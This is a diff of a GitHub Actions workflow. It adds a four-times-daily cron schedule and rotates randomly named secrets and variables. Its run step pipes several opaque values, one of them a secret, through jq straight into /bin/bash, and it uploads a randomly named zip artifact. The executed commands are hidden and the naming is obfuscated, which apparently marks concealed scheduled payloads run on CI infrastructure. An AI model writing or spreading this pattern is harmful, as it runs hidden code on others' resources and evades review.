@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '58 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,17 +24,18 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          ezw8858: ${{ secrets.ezw8858 }}
+          upti13903: ${{ secrets.upti13903 }}
         run: |
-          printf '%s' "$ezw8858" | jq -r .lxk84954 | /bin/bash
-          echo $hg026 | jq -r .nkim5 | /bin/bash
-          printf '%s' "$nhomz774" | jq -r .zinc3381 | /bin/bash
-          echo $ewlxl4 | jq -r .ah016 | /bin/bash
+          printf '%s' "$upti13903" | jq -r .slk00739 | /bin/bash
+          printf '%s' "$l332" | jq -r .f92 | /bin/bash
+          echo $gpvvh03 | jq -r .pcadv682 | /bin/bash
+          printf '%s' "$bhwoo8227" | jq -r .rl79 | /bin/bash
+          printf '%s' "$sya77094" | jq -r .rplqu7407 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 80mjVVps
+          name: NSvysdk2
           path: "*.zip"
           retention-days: 1
